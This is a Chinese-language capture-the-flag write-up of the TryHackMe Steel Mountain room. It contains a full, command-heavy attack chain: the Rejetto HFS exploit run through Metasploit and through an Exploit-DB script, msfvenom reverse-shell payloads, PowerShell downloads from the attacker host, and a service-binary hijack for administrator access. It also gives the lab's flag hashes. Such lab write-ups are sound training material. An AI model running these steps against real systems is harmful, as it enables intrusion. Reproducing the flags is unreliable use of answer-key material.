# THM-Steel Mountain-练习

本文相关的TryHackMe实验房间链接：https://tryhackme.com/room/steelmountain

## 简介

目标机器不响应 ping (ICMP) ，尝试使用 metasploit 获得目标机器（Windows系统）初始访问权限，再使用 powershell脚本进行Windows 权限提升枚举，最后尝试在Windows机器上提升权限到管理员。

启动目标机器，直接使用目标ip地址访问目标站点，查看网页源码，获取第一小题答案：

![image-20221013164338875](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013164338875.png)

![image-20221013164417205](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013164417205.png)

**答题卡**

![image-20221013164454703](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013164454703.png)

## 获取目标机的初始访问权限

使用nmap进行端口扫描操作：

```shell
nmap -Pn -sV -sC 10.10.42.153 
```

![image-20221013165357682](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013165357682.png)

除了默认的80端口之外，目标站点还开放了8080端口提供http服务，查看8080端口的webserver页面：

![image-20221013171732269](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013171732269.png)

![image-20221013171332357](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013171332357.png)

使用搜索引擎，找到相关漏洞信息，查看CVE编号：

> 通过漏洞库查询cve编号：https://www.exploit-db.com/

![image-20221013170945115](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013170945115.png)

![image-20221013172037737](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013172037737.png)

接下来，我们使用 Metasploit 利用和以上cve编号相对应的漏洞，获得一个初始 shell 并查看user.txt内容:

```shell
msfconsole -q             #跳过提示语打开msf
search Rejetto
use exploit/windows/http/rejetto_hfs_exec
options
set RHOSTS 10.10.42.153 
set RPORT 8080
set LHOST 10.14.30.69     #当使用OpenVPN连接到TryHackMe内网时，需要设置该选项为tun0地址
exploit                   #或者run

shell                     #由meterpreter shell界面进入Windows shell界面
cd C:\Users\bill\Desktop\
dir
more user.txt
```

![image-20221013200243609](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013200243609.png)

> b04763b6fcf51fcd7c13abc7db4fd365

**答题卡**

![image-20221013200343692](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013200343692.png)

## 权限提升

现在我们在这台机器上有了一个初始 shell，我们可以进一步枚举操作系统信息并查看将权限升级到root的利用点，使用名为“ PowerUp”的 PowerShell 脚本来评估这台 Windows 机器并确定目标机是否存在任何异常和错误配置。

下载脚本到你的本地终端(注意不要使用命令行的形式下载这个脚本，而是复制脚本内容并新建一个ps1文件):

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

一旦脚本保存在本地，就可以通过 meterpreter shell 上传该脚本:

```shell
exit       #退出刚才进入的Windows shell界面，回到meterpreter shell界面
upload /home/hekeats/TOOLS/PowerUp.ps1
```

![image-20221013200922267](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013200922267.png)

然后我们可以通过meterpreter会话来加载PowerShell扩展，并进入 PowerShell的shell界面并执行脚本:

```powershell
load powershell
powershell_shell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

![image-20221013205824347](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013205824347.png)

查看输出，有一个特定服务的 CanRestart 选项被设置为 true，此选项被设置为 true 后，我们就能够在系统上重新启动此服务；而且这个应用程序的目录也是可写的，这意味着我们可以用一个恶意应用程序替换合法的应用程序，一旦服务重新启动，我们的恶意程序将运行。

> ServiceName ：AdvancedSystemCareService9
>
> ModifiablePath：C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe

msfvenom可用于生成反向shell的payload并将其输出为windows可执行文件，我们用msfvenom来生成一个和之前的应用程序同名的恶意应用程序:

```shell
#msfvenom -p windows/shell_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -e x86/shikata_ga_nai -f exe-service -o filename.exe

msfvenom -p windows/shell_reverse_tcp LHOST=10.14.30.69 LPORT=1234 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```

然后可以通过 meterpreter shell (首先通过 CTRL + C 退出 PowerShell 会话)将其上传到目标机器:

```shell
upload ASCService.exe
```

进入普通的windows shell界面，我们先停止合法的服务运行，然后用恶意的二进制程序替换正常的同名应用程序文件:

```cmd
shell
sc stop AdvancedSystemCareService9    
copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

![image-20221013205436576](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013205436576.png)

关于SC命令（Windows shell不区分大小写）：

```shell
SC命令的格式：SC [Servername] command Servicename [Optionname= Optionvalues]

Servername：指定服务所在的远程服务器的名称。名称必须采用通用命名约定 (UNC) 格式（“\\myserver”）。如果是在本地运行SC.exe，请忽略此参数。
command ：如query,start,stop,create,config等

Servicename：服务名，也就是要配置的那个服务的名字，例如你要启动一个服务你就输入sc start +你要启动的服务名称（并非是服务显示名称）。
Optionname= Optionvalues：是选项名和选项的值。
```

在重新启动服务之前，我们需要在攻击机终端中设置一个netcat侦听器:

```shell
nc -nlvp 1234
```

然后我们可以在 windows shell 中重新启动之前停止的服务:

```
sc start AdvancedSystemCareService9
```

一旦之前的服务重新启动，攻击机上的侦听器中将获取到反向 shell。成功获取管理员权限之后，我们可以切换到 Administrator 的 Desktop 目录查看root.txt 文件:

```
cd C:\Users\Administrator\Desktop  
dir
more root.txt
```

![image-20221013210312098](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013210312098.png)

> 9af5f314f57607c00fd09803a587db80

**答题卡**

![image-20221013211005429](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013211005429.png)

![image-20221013211028695](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013211028695.png)

## 不使用Metasploit获取初始访问权限并提权

注意：此处建议重启目标机。

现在，我们来看看如何在不使用 Metasploit 的情况下获得初始权限和进行权限提升。为此，我们将使用 PowerShell 和 winPEAS 来枚举目标系统并收集相关信息以提权到管理员用户。

我们还是使用之前提到的CVE编号所对应的漏洞来获取初始访问权限，然而，这次我们手动使用exp而不是通过msf来执行exp。

> exp链接（一个python脚本）：https://www.exploit-db.com/exploits/39161

为了使这种攻击起作用，需要同时激活Web服务器和netcat侦听器，如果你的系统上还没有 netcat 静态二进制文件，那么你可以从GitHub下载。我们还将使用 winPEAS来枚举目标机系统信息。

> netcat二进制文件：https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
>
> winPEAS（在下载页选择winPEASx64.exe）：https://github.com/carlospolop/PEASS-ng/releases/tag/20221009

为了方便起见，我新建了一个文件夹放置刚才下载的三个文件（exp脚本使用之前--记得修改好ip和端口，下载的netcat二进制文件要修改名称为nc.exe）：

> 查看exp脚本内容，我们能够发现该脚本已经指定要调用名称为nc.exe的文件

![image-20221013221642540](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013221642540.png)

然后需要开启3个独立的终端窗口来完成攻击：

终端1-通过python启用 HTTP web 服务器

```shell
#终端界面进入到/home/hekeats/桌面/SteelMountain目录
#python3 -m http.server 8000 无响应
python2 -m SimpleHTTPServer 80
```

终端2-设置netcat 监听器

```shell
nc -nvlp 1234
```

终端3-执行exp进行攻击（注意所用脚本的python版本）

```shell
#终端界面进入到/home/hekeats/桌面/SteelMountain目录
python2 39161.py 10.10.42.153 8080 #第一次执行会将SteelMountain/目录下的nc.exe上传到目标系统
python2 39161.py 10.10.42.153 8080 #第二次执行会发送一个反向shell回连到攻击机监听器
```

在终端2界面 成功获取目标机的shell：

![image-20221013222436872](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013222436872.png)

使用Powershell相关命令将winPEAS脚本拉取到目标系统上：

```cmd
#使用终端2界面
cd C:\Users\Bill\Desktop
#Format is "powershell -c "command here"
powershell -c wget "http://10.14.30.69/winPEASx64.exe" -outfile "winPEAS.exe"
```

运行winPEAS脚本（枚举目标系统的信息，如服务名称等）：

```cmd
#使用终端2界面
winPEAS.exe
#我们也可以运行powershell -c 命令手动查找服务名称:powershell -c "Get-Service"
```

![image-20221013230016461](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013230016461.png)

运行winPEAS之后，查看输出的服务信息，观察在运行时"未引用路径"的服务名称：

![image-20221013230716190](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013230716190.png)

使用msfvenom生成一个exe形式的反向shell payload，输出的文件名和服务对应的文件名相同（此处payload设置的端口，不要使用刚刚建立普通shell的端口）：

```shell
#使用终端3界面
msfvenom -p windows/shell_reverse_tcp LHOST=10.14.30.69 LPORT=4444 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```

![image-20221013231619415](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013231619415.png)

然后可以通过 PowerShell 将这些数据传输到目标系统中:

```cmd
#使用终端2界面
powershell -c wget "http://10.14.30.69/ASCService.exe" -outfile "ASCService.exe"
```

![image-20221013231938619](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013231938619.png)

然后，我们可以停止合法的服务运行，并用我们的恶意二进制文件替换应用程序文件:

```cmd
sc stop AdvancedSystemCareService9

copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

![image-20221013232400577](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013232400577.png)

在重新启动服务之前，需要在本地机器上使用创建有效负载时引用的端口设置一个netcat侦听器:

```shell
#使用终端3界面
nc -lvnp 4444
```

当攻击机上的netcat侦听器正在运行时，可以在目标机上重新启动刚才停止的服务:

```shell
#终端2界面
sc start AdvancedSystemCareService9
```

在目标机上重启服务之后，攻击机将获取到反向shell，权限为管理员级别，现在在攻击机界面操作：切换到 Administrator 的 Desktop 目录并获取 root.txt 文件

```cmd
#在终端3界面
cd C:\Users\Administrator\Desktop  
dir
more root.txt
```

![image-20221013232918006](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013232918006.png)

**答题卡**

![image-20221013233546568](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013233546568.png)
